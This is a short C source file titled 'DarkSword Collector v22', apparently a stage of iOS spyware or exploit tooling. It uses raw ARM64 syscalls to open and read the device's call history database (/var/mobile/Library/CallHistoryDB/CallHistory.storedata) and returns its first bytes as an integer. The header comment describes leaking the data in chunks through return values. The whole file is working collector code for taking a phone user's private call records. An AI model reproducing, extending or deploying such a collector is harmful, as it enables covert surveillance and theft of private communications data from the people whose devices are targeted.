/**
 * DarkSword Collector v22 - Read CallHistory first 16 bytes via return value
 * Uses multiple calls: first call stores data, subsequent calls return chunks
 * Since we can't pass args, use a fixed approach: return 4 bytes of CallHistory
 * encoded as a single 32-bit int (bytes 0-3)
 */

static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory");
    return x0;
}
static long _svc2(long n, long a, long b) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory");
    return x0;
}
static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory");
    return x0;
}

#define SYS_open  5
#define SYS_read  3
#define SYS_close 6

/* Read N bytes from a file, return first 4 as int */
static int _read4(const char *path) {
    int fd = (int)_svc2(SYS_open, (long)path, 0);
    if (fd < 0) return 0xDEAD0000;
    unsigned char buf[16] = {0};
    int n = (int)_svc3(SYS_read, fd, (long)buf, 16);
    _svc1(SYS_close, fd);
    if (n < 4) return 0xBEEF0000 | (n & 0xFFFF);
    return (int)buf[0] | ((int)buf[1] << 8) | ((int)buf[2] << 16) | ((int)buf[3] << 24);
}

int ds_start(void) {
    /* Read CallHistory first 4 bytes */
    return _read4("/var/mobile/Library/CallHistoryDB/CallHistory.storedata");
}
